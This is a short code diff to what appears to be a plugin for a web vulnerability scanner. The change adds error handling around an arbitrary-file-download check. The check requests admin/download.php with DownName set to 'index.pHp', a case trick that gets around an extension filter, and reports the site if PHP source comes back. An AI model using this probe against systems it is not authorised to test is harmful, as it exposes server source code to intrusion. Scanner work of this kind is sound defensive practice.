@@ -25,8 +25,11 @@ class Script(BaseScript):
                 for path in self.get_url_normpath_list(self.url):
                     poc = "index.php"
                     url = path +"admin/download.php?DownName=%s" % poc.replace("h","H")
-                    async with session.get(url=url, headers = headers) as res:
-                        if res != None:
-                            text = await res.text()
-                            if '<?php' in text:
-                                yield url
+                    try:
+                        async with session.get(url=url, headers = headers) as res:
+                            if res != None:
+                                text = await res.text()
+                                if '<?php' in text:
+                                    yield url
+                    except:
+                        pass
